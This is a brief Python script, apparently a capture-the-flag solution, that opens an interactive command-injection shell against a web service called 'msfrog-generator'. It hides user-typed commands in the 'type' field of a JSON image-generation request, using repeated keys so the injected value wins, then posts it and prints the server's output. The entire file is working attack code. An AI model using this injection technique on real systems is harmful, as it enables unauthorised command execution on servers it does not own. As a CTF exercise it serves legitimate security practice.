import httpx
import readline

url = 'https://msfrog-generator.be.ax/api/generate'


def req(cmd):
    data = [{
        "type": "msanger.png", "pos": {"x": 0, "y": 0},
        "type": "msanger.png", "pos": {"x": 0, "y": 0},
        "type": "msanger.png", "pos": {"x": 0, "y": 0},
        "type": f"{cmd}", "pos": {"x": 0, "y": 0},
    }]
    res = httpx.post(url, json=data).text
    print(res)
    return res


while True:
    cmd = input('> ')
    req(cmd)
